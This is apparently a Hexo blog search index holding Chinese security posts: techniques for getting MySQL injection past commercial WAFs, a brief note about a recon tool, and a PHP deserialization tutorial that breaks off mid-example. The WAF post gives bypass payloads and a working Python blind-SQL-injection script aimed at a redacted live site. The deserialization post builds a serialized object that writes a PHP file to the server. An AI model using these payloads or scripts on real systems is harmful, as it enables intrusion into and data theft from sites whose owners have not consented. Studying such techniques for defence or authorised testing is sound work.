<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>sql注入绕过waf的一些姿势</title>
    <url>/2022/01/14/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a><strong>1、前言</strong></h2><h6 id="目前sql注入绕过waf的姿势有很多，今天我来写下mysql注入绕过waf里面的一些姿势，是我平时实战里遇到的情况"><a href="#目前sql注入绕过waf的姿势有很多，今天我来写下mysql注入绕过waf里面的一些姿势，是我平时实战里遇到的情况" class="headerlink" title="目前sql注入绕过waf的姿势有很多，今天我来写下mysql注入绕过waf里面的一些姿势，是我平时实战里遇到的情况"></a>目前sql注入绕过waf的姿势有很多，今天我来写下mysql注入绕过waf里面的一些姿势，是我平时实战里遇到的情况</h6><p><strong>绕过waf的一些常见方法</strong></p>
<p>①关键字大小写混合</p>
<p>②关键字替换</p>
<p>③使用编码</p>
<p>④使用注释</p>
<p>⑤等价的函数和命令</p>
<p>⑥使用特殊符号</p>
<p>⑦HTTP参数控制</p>
<p>⑧缓冲区溢出</p>
<p>⑨整合绕过</p>
<h5 id="1-开局一个搜索框-360-waf"><a href="#1-开局一个搜索框-360-waf" class="headerlink" title="#1.开局一个搜索框(360_waf)"></a>#1.开局一个搜索框(360_waf)</h5><p><img src="https://ae01.alicdn.com/kf/Heccbbcffa9174fc0b99457d34c00420ac.png"></p>
<h6 id="tips-这种搜索框处的sql注入，后端的sql语句通常都是使用了模糊查询，所以我们平时闭合语句的时候要注意"><a href="#tips-这种搜索框处的sql注入，后端的sql语句通常都是使用了模糊查询，所以我们平时闭合语句的时候要注意" class="headerlink" title="tips:这种搜索框处的sql注入，后端的sql语句通常都是使用了模糊查询，所以我们平时闭合语句的时候要注意"></a><strong>tips:这种搜索框处的sql注入，后端的sql语句通常都是使用了模糊查询，所以我们平时闭合语句的时候要注意</strong></h6><h6 id="2-啪的一声，很快啊，360waf把我给拦截了，这里我经过fuzz得到了该waf拦截关键字和空格，闭合语句为a-’"><a href="#2-啪的一声，很快啊，360waf把我给拦截了，这里我经过fuzz得到了该waf拦截关键字和空格，闭合语句为a-’" class="headerlink" title="#2.啪的一声，很快啊，360waf把我给拦截了，这里我经过fuzz得到了该waf拦截关键字和空格，闭合语句为a%’)"></a><strong>#2.啪的一声，很快啊，360waf把我给拦截了，这里我经过fuzz得到了该waf拦截关键字和空格，闭合语句为a%’)</strong></h6><p><img src="https://ae01.alicdn.com/kf/Hab769454e5ac446c8746ebc2b5aea820R.png"></p>
<h6 id="3-绕过它！！"><a href="#3-绕过它！！" class="headerlink" title="#3.绕过它！！"></a><strong>#3.绕过它！！</strong></h6><h6 id="这里空格可以使用括号来代替，而这里的waf连select等关键词都拦截了，除非mysql版本高，不然很难绕过select，而这里我们运用了http的协议覆盖来绕过它"><a href="#这里空格可以使用括号来代替，而这里的waf连select等关键词都拦截了，除非mysql版本高，不然很难绕过select，而这里我们运用了http的协议覆盖来绕过它" class="headerlink" title="这里空格可以使用括号来代替，而这里的waf连select等关键词都拦截了，除非mysql版本高，不然很难绕过select，而这里我们运用了http的协议覆盖来绕过它"></a>这里空格可以使用括号来代替，而这里的waf连select等关键词都拦截了，除非mysql版本高，不然很难绕过select，而这里我们运用了http的协议覆盖来绕过它</h6><h6 id="paylaod：2021-’-amp-amp-ascii-substr-database-1-1-gt-97"><a href="#paylaod：2021-’-amp-amp-ascii-substr-database-1-1-gt-97" class="headerlink" title="paylaod：2021%’)&amp;&amp;(ascii(substr(database(),1,1))&gt;97#"></a><strong>paylaod：2021%’)&amp;&amp;(ascii(substr(database(),1,1))&gt;97#</strong></h6><img src="https://ae01.alicdn.com/kf/H4591ffe96b9345d9bc2833a0ec72a0f0k.jpg" style="zoom:200%;" />

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">可以看到这是个上传包的格式，HTTP头里的Content-Type一般有application/x-www-form-urlencoded，multipart/form-data，text/plain三种，其中multipart/form-data表示数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当waf没有规则匹配该协议传输的数据时可被绕过。</span><br></pre></td></tr></table></figure>

<h6 id="构造python脚本进行注入"><a href="#构造python脚本进行注入" class="headerlink" title="构造python脚本进行注入"></a>构造python脚本进行注入</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>:<span class="string">&quot;www.xxxx.cn&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;https://www.xxx.cn/search.php?keyword=233&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">session=requests.session()</span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">url = <span class="string">&quot;https://www.xxxx.cn/search.php/test.css&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload=<span class="string">&quot;2021%&#x27;)&amp;&amp;(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data=OrderedDict([(<span class="string">&quot;keyword&quot;</span>, (<span class="literal">None</span>, payload))])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=session.post(url,headers=headers,files=data)</span><br><span class="line">            <span class="comment"># print(r.request.body)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(r.text)&gt;<span class="number">13106</span>:</span><br><span class="line">                result=result+<span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> TimeoutError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注入结束&quot;</span>)</span><br></pre></td></tr></table></figure>

<h6 id="成功注入出数据"><a href="#成功注入出数据" class="headerlink" title="成功注入出数据"></a>成功注入出数据</h6><p><img src="https://ae01.alicdn.com/kf/Hc2810e8fd4974d4c8d0c36b6ce3763b7l.png"></p>
<h6 id="1-开局一个api接口-阿里云waf"><a href="#1-开局一个api接口-阿里云waf" class="headerlink" title="#1.开局一个api接口(阿里云waf)"></a><strong>#1.开局一个api接口</strong>(阿里云waf)</h6><h6 id="ps：这个是我之前src挖的一个盲注入，修复了，所以就没图了，见谅"><a href="#ps：这个是我之前src挖的一个盲注入，修复了，所以就没图了，见谅" class="headerlink" title="ps：这个是我之前src挖的一个盲注入，修复了，所以就没图了，见谅"></a>ps：这个是我之前src挖的一个盲注入，修复了，所以就没图了，见谅</h6><h6 id="这里经过fuzz也得到了他过滤了空格，ascii，substr，user-select-gt-lt-等众多函数"><a href="#这里经过fuzz也得到了他过滤了空格，ascii，substr，user-select-gt-lt-等众多函数" class="headerlink" title="这里经过fuzz也得到了他过滤了空格，ascii，substr，user(),select,=,&gt;,&lt;等众多函数"></a>这里经过fuzz也得到了他过滤了空格，ascii，substr，user(),select,=,&gt;,&lt;等众多函数</h6><h6 id="这里我用了等价函数的方式进行绕过"><a href="#这里我用了等价函数的方式进行绕过" class="headerlink" title="这里我用了等价函数的方式进行绕过"></a>这里我用了等价函数的方式进行绕过</h6><h6 id="总体payload为-admin’-mid-user-1-1-like-“-a-”"><a href="#总体payload为-admin’-mid-user-1-1-like-“-a-”" class="headerlink" title="总体payload为:admin’||(mid(@@user,1,1)like(“%a%”))#"></a>总体payload为:admin’||(mid(@@user,1,1)like(“%a%”))#</h6><h6 id="这里的mid等价余substr函数然后使用like模糊匹配，查看页面变化来判断字符"><a href="#这里的mid等价余substr函数然后使用like模糊匹配，查看页面变化来判断字符" class="headerlink" title="这里的mid等价余substr函数然后使用like模糊匹配，查看页面变化来判断字符"></a>这里的mid等价余substr函数然后使用like模糊匹配，查看页面变化来判断字符</h6><h6 id="这里也可以用hex-mid-函数来进行注入，效果一样，最后解码即可"><a href="#这里也可以用hex-mid-函数来进行注入，效果一样，最后解码即可" class="headerlink" title="这里也可以用hex(mid)函数来进行注入，效果一样，最后解码即可"></a>这里也可以用hex(mid)函数来进行注入，效果一样，最后解码即可</h6><h5 id="通过-SQL-函数绕过-SQL-注入-WAF-的案例研究参考链接：https-mp-weixin-qq-com-s-wf25AJssCzAz5RAwNgi33g"><a href="#通过-SQL-函数绕过-SQL-注入-WAF-的案例研究参考链接：https-mp-weixin-qq-com-s-wf25AJssCzAz5RAwNgi33g" class="headerlink" title="通过 SQL 函数绕过 SQL 注入 WAF 的案例研究参考链接：https://mp.weixin.qq.com/s/wf25AJssCzAz5RAwNgi33g"></a>通过 SQL 函数绕过 SQL 注入 WAF 的案例研究参考链接：<a class="link"   href="https://mp.weixin.qq.com/s/wf25AJssCzAz5RAwNgi33g" >https://mp.weixin.qq.com/s/wf25AJssCzAz5RAwNgi33g<i class="fas fa-external-link-alt"></i></a></h5>]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>团队信息收集开发</title>
    <url>/2022/01/25/%E5%9B%A2%E9%98%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<h4 id="Qaseem信息收集工具正在开发中"><a href="#Qaseem信息收集工具正在开发中" class="headerlink" title="Qaseem信息收集工具正在开发中"></a>Qaseem信息收集工具正在开发中</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">###### 这几天想为团队开发一个信息收集工具，主要开发思路是调用工具和各种网络搜索引擎和api接口获取隐秘资产，主要用到爱妻查，备案查询和certs，360quake等各种接口和调用各种工具，目前正在开发中，本人不是专门干开发的，所以写的有点慢和正在调试bug，而且也没啥时间写，偶尔写一下，因为要升学考试的复习</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="正在开发中哈，如果有啥好想法或者想一起开发的可以联系我哈"><a href="#正在开发中哈，如果有啥好想法或者想一起开发的可以联系我哈" class="headerlink" title="正在开发中哈，如果有啥好想法或者想一起开发的可以联系我哈"></a>正在开发中哈，如果有啥好想法或者想一起开发的可以联系我哈</h5><img src="https://ae01.alicdn.com/kf/H2fb6ec1d92a24e628a26c7636fce3dd2t.png" style="zoom:200%;" />



<h5 id="不说了写bug去了"><a href="#不说了写bug去了" class="headerlink" title="不说了写bug去了"></a>不说了写bug去了</h5><p><img src="https://ae01.alicdn.com/kf/H0dfcbae6c9b942edabad67f6c3d9af86K.png"></p>
<h6 id="ps：后面我会发一篇代码审计的文章，审计的漏洞和payload我将发出来，大家可以看看思路哈哈哈，撤了"><a href="#ps：后面我会发一篇代码审计的文章，审计的漏洞和payload我将发出来，大家可以看看思路哈哈哈，撤了" class="headerlink" title="ps：后面我会发一篇代码审计的文章，审计的漏洞和payload我将发出来，大家可以看看思路哈哈哈，撤了"></a>ps：后面我会发一篇代码审计的文章，审计的漏洞和payload我将发出来，大家可以看看思路哈哈哈，撤了</h6>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>日常</tag>
      </tags>
  </entry>
  <entry>
    <title>对于php反序列化的一些笔记</title>
    <url>/2022/01/14/%E5%AF%B9%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="什么是PHP反序列化"><a href="#什么是PHP反序列化" class="headerlink" title="什么是PHP反序列化"></a>什么是PHP反序列化</h2><p>php序列化是指将php的对象（或者是普通的变量）转化为字符串的一个过程，目的是为了方便储存和传输数据。而反序列化就是将序列化后的字符串转化为对应的对象或普通变量的过程，下面我们来看一下php序列化和反序列化的函数</p>
<h3 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h3><p>先看下php手册的说明</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">serialize(<span class="keyword">mixed</span> <span class="variable">$value</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure>

<p><strong>serialize()</strong> 返回字符串，此字符串包含了表示 <code>value</code> 的字节流，可以存储于任何地方。</p>
<p>这有利于存储或传递 PHP 的值，同时不丢失其类型和结构。</p>
<h3 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">unserialize(<span class="keyword">string</span> <span class="variable">$str</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>

<p><strong>unserialize()</strong> 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。</p>
<p>来个demo</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span> = <span class="string">&#x27;aaaaaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$i</span> =  <span class="number">11111</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;111&#x27;</span>,<span class="string">&#x27;222&#x27;</span>);</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pro</span>=<span class="string">&#x27;it\&#x27;s protected&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pri</span> = <span class="string">&#x27;it\&#x27;s private&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$demo</span> =<span class="keyword">new</span> demo();</span><br><span class="line"><span class="variable">$a</span> =serialize(<span class="variable">$demo</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="comment">//输出结果如下，不可见字符用\+十六进制表示</span></span><br><span class="line"><span class="comment">//O:4:&quot;demo&quot;:5:&#123;s:1:&quot;s&quot;;s:6:&quot;aaaaaa&quot;;s:1:&quot;i&quot;;i:11111;s:3:&quot;arr&quot;;a:2:&#123;i:0;s:3:&quot;111&quot;;i:1;s:3:&quot;222&quot;;&#125;S:6:&quot;\00*\00pro&quot;;s:14:&quot;it&#x27;s protected&quot;;S:9:&quot;\00demo\00pri&quot;;s:12:&quot;it&#x27;s private&quot;;&#125;</span></span><br><span class="line">var_dump(unserialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//输出结果如下：</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">class demo#2 (5) &#123;</span></span><br><span class="line"><span class="comment">  public $s =&gt;</span></span><br><span class="line"><span class="comment">  string(6) &quot;aaaaaa&quot;</span></span><br><span class="line"><span class="comment">  public $i =&gt;</span></span><br><span class="line"><span class="comment">  int(11111)</span></span><br><span class="line"><span class="comment">  public $arr =&gt;</span></span><br><span class="line"><span class="comment">  array(2) &#123;</span></span><br><span class="line"><span class="comment">    [0] =&gt;</span></span><br><span class="line"><span class="comment">    string(3) &quot;111&quot;</span></span><br><span class="line"><span class="comment">    [1] =&gt;</span></span><br><span class="line"><span class="comment">    string(3) &quot;222&quot;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">  protected $pro =&gt;</span></span><br><span class="line"><span class="comment">  string(14) &quot;it&#x27;s protected&quot;</span></span><br><span class="line"><span class="comment">  private $pri =&gt;</span></span><br><span class="line"><span class="comment">  string(12) &quot;it&#x27;s private&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



<h2 id="序列化字符串格式"><a href="#序列化字符串格式" class="headerlink" title="序列化字符串格式"></a>序列化字符串格式</h2><p>php在序列化后用字母表示这个变量的类型，变量类型会写在php序列化字符串的每一个子字符串的开头</p>
<p>下面总结了一些常见的变量类型的字母表示</p>
<table>
<thead>
<tr>
<th>变量类型</th>
<th>序列化后字母表示</th>
</tr>
</thead>
<tbody><tr>
<td>整型</td>
<td><code>i</code></td>
</tr>
<tr>
<td>双精度浮点</td>
<td><code>d</code></td>
</tr>
<tr>
<td>布尔</td>
<td><code>b</code></td>
</tr>
<tr>
<td>NULL</td>
<td><code>N</code></td>
</tr>
<tr>
<td>数组</td>
<td><code>a</code></td>
</tr>
<tr>
<td>字符串</td>
<td><code>s</code>/<code>S</code></td>
</tr>
<tr>
<td>类</td>
<td><code>O</code></td>
</tr>
</tbody></table>
<p>说明下在字符串中：<code>s</code>是最普通的字符串，而<code>S</code>可以用反斜杠+16进制来表示字符</p>
<p>一个php变量在序列化之后一般有以下的格式，<code>&lt;&gt;</code>为可嵌套部分，可以是以下任意类型的变量序列化后的字符串</p>
<p>整型/double型/布尔型：<code>i/d/b:[变量值];</code></p>
<p>字符串类：<code>s/S:[字符串长度]:&quot;[字符串值]&quot;;</code></p>
<p>NULL类型：<code>N;</code></p>
<p>数组：<code>a:[数组元素个数]&#123;&lt;下标(整型)或数组的键(字符串)&gt;;&lt;数组的值&gt;;&lt;下标(整型)或数组的键(字符串)&gt;;&lt;数组的值&gt;;&#125;</code></p>
<p>对象：<code>O:[类长度]:&quot;[类名]&quot;:[属性个数]&#123;s:[属性名1长度]:&quot;[属性名1]&quot;;&lt;属性值n&gt;;...;s:[属性名n长度]:&quot;[属性名n]&quot;;&lt;属性值n&gt;;&#125;</code></p>
<p>在表示修饰对象的属性访问控制修饰符时，会在属性名这里表示</p>
<p>比如在属性名前面加上<code>\00*\00</code>来表示该属性被<code>protected</code>属性修饰</p>
<p>在属性名前面加上<code>\00[类名]\00</code>来表示该属性被<code>private</code>属性修饰</p>
<h2 id="PHP魔术方法"><a href="#PHP魔术方法" class="headerlink" title="PHP魔术方法"></a>PHP魔术方法</h2><p>在php的类中存在的魔术方法，在一定的条件下会被自动调用，魔术方法均为双下划线开头，下面给出一些魔术方法的简单描述</p>
<table>
<thead>
<tr>
<th>方法名</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td><code>__construct()</code></td>
<td>构造方法，在一个类在实例化时被调用</td>
</tr>
<tr>
<td><code>__destruct()</code></td>
<td>析构方法，在一个对象在被销毁的时候 被调用</td>
</tr>
<tr>
<td><code>__toString()</code></td>
<td>在一个对象在被当作字符串使用时调用的方法，返回值必须是字符串</td>
</tr>
<tr>
<td><code>__invoke()</code></td>
<td>在一个对象被作为函数使用时的方法</td>
</tr>
<tr>
<td><code>__call()</code></td>
<td>在一个对象被调用了一个不存在的方法时调用</td>
</tr>
<tr>
<td><code>__callStatic()</code></td>
<td>在静态的上下文中调用不存在的方法时使用</td>
</tr>
<tr>
<td><code>__sleep()</code></td>
<td>在一个对象在序列化时被调用的方法，返回值为包含属性名字的数组，如果没有加会抛一个<code>E_NOTICE</code>级别的错误</td>
</tr>
<tr>
<td><code>__wakeup()</code></td>
<td>在一个对象被反序列化的时候调用</td>
</tr>
<tr>
<td><code>__get()</code></td>
<td>在尝试读取不可访问或不存在的对象属性时被自动调用</td>
</tr>
<tr>
<td><code>__set()</code></td>
<td>在尝试给不可访问或不存在的对象属性赋值时会被自动调用</td>
</tr>
</tbody></table>
<p>在这里说明几个函数：</p>
<h3 id="toString-方法"><a href="#toString-方法" class="headerlink" title="__toString()方法"></a>__toString()方法</h3><p>这个方法将在一个对象被当作字符串使用的时候会被调用，这包括很多情况，举几个例子：</p>
<ul>
<li>使用<code>echo</code>，<code>print</code>输出声明了<code>__toString</code>方法的对象时或该对象参与格式化字符串输出时</li>
<li>用一个字符串和声明了<code>__toString</code>方法的对象进行拼接</li>
<li>用一个字符串和一个声明了<code>__toString</code>方法的对象进行比较</li>
<li>使用处理字符串的函数处理声明了<code>__toString</code>方法的对象，比如<code>md5()</code>，<code>addslashes()</code>，<code>in_array()</code>等</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;this is a test&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;called __toString&quot;</span>.PHP_EOL;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> test1();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;printf:&quot;</span>.PHP_EOL;</span><br><span class="line">printf(<span class="string">&quot;output: %s\n&quot;</span>,<span class="variable">$t</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;addslashes:&quot;</span>.PHP_EOL;</span><br><span class="line">addslashes(<span class="variable">$t</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;md5:&quot;</span>.PHP_EOL;</span><br><span class="line">md5(<span class="variable">$t</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;==:&quot;</span>.PHP_EOL;</span><br><span class="line"><span class="variable">$t</span>==<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;in_array:&quot;</span>.PHP_EOL;</span><br><span class="line">in_array(<span class="variable">$t</span>,<span class="keyword">array</span>(<span class="string">&quot;114514&quot;</span>,<span class="string">&quot;neko&quot;</span>,<span class="string">&quot;yukinoshita&quot;</span>,<span class="string">&quot;this is a test&quot;</span>,<span class="string">&quot;nacho nya&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="C:\Users\23531\Desktop\hexo\themes\next\source\images\ser_1.jpg"></p>
<p>可以看见以上函数都被调用了，其中在<code>in_array()</code>函数中，被调用的次数和匹配到<code>__toString()</code>方法的返回值相同的位置相同</p>
<h3 id="call-方法和-callStatic-方法"><a href="#call-方法和-callStatic-方法" class="headerlink" title="__call()方法和__callStatic()方法"></a>__call()方法和__callStatic()方法</h3><p>__call方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> __call(<span class="keyword">string</span> <span class="variable">$name</span>, <span class="keyword">array</span> <span class="variable">$arguments</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>

<p>在对象中调用一个不可访问方法时，<code>__call()</code>会被调用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is an unsupported method &quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> test1();</span><br><span class="line"><span class="variable">$a</span>-&gt;neko();</span><br></pre></td></tr></table></figure>

<p>__callStatic()方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> __callStatic(<span class="keyword">string</span> <span class="variable">$name</span>, <span class="keyword">array</span> <span class="variable">$arguments</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>

<p>在静态上下文中调用一个不可访问方法时，<a class="link"   href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.callstatic" >__callStatic()<i class="fas fa-external-link-alt"></i></a> 会被调用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is an unsupported method &quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test1::neko();</span><br></pre></td></tr></table></figure>

<p>其中在这两个函数的定义中，<code>$name</code>是这调用方法的名字，<code>$argument</code>是传递给该函数参数的数组</p>
<h2 id="对象注入"><a href="#对象注入" class="headerlink" title="对象注入"></a>对象注入</h2><p>在存在一个用户可控的<code>unserialize()</code>函数的参数时，我们可以构造特定的序列化字符串来达到创建任意类的目的，如果这个类有存在着<code>__wakeup()</code>，<code>__destruct()</code>等魔术方法且存在一些可以利用的函数，这里就可以利用这个类进行一波操作</p>
<p>举个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">logger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;log.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27;nothing to log&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;obj&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;obj&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们只要构造合适的php序列化字符串传入，覆盖<code>$filename</code>和<code>$content</code>然后触发<code>__destruct()</code>方法就可以成功实现任意文件写入了</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">logger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;a.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> logger();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">/*O:6:&quot;logger&quot;:2:&#123;s:8:&quot;filename&quot;;s:5:&quot;a.php&quot;;s:7:&quot;content&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;*/</span></span><br></pre></td></tr></table></figure>

<p>传入一下，成功</p>
<h2 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h2><p>POP：面向属性编程</p>
<p>是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。</p>
<p>一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p>
<p>来个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 